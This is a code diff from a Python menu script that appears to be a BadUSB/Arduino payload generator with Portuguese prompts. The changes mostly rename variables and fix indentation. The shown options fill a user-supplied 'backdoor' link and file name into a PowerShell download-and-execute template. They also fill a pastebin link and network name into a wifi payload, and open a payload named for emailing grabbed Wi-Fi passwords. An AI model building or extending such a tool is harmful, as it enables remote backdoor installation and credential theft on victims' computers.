@@ -46,14 +46,14 @@ def subpowershellmenu():
         os.system("start out/OUT-WifiGrabbpasswordtoMail.ino")
 
     elif submenuselect == "3":
-        newpass = raw_input(str("Digite o link do backdoor : "))
+        link = raw_input(str("Digite o link do backdoor : "))
         backdoor = raw_input(str("Digite o nome do arquivo : "))
-        print (newpass)
+        
 
         f = open('payloads/Psdownandexecute.ino', 'r')
         filedata = f.read()
         f.close()
-        newdata = filedata.replace("HOST", newpass).replace("PAYLOAD", backdoor)
+        newdata = filedata.replace("HOST", link).replace("PAYLOAD", backdoor)
         f = open('out/OUT-Psdownandexecute.ino', 'w')
         f.write(newdata)
         f.close()
@@ -61,18 +61,16 @@ def subpowershellmenu():
 		
 		
 	elif submenuselect == "4":
-	    link = raw_input(str("Digite o link pastebin : "))
-        essid = raw_input(str("Digite o nome da rede : "))
-        print (newpass)
-
-        f = open('payloads/wifiassociationFast.ino', 'r')
-        filedata = f.read()
-        f.close()
-        newdata = filedata.replace("PASTEBIN", link).replace("ESSID", essid)
-        f = open('out/OUT-wifiassociationFast.ino', 'w')
-        f.write(newdata)
-        f.close()
-        os.system("start out/OUT-wifiassociationFast.ino")
+		link = raw_input(str("Digite o link pastebin : "))
+		essid = raw_input(str("Digite o nome da rede : "))
+		f = open('payloads/wifiassociationFast.ino', 'r')
+		filedata = f.read()
+		f.close()
+		newdata = filedata.replace("PASTEBIN", link).replace("ESSID", essid)
+		f = open('out/OUT-wifiassociationFast.ino', 'w')
+		f.write(newdata)
+		f.close()
+		os.system("start out/OUT-wifiassociationFast.ino")
 	
 
 
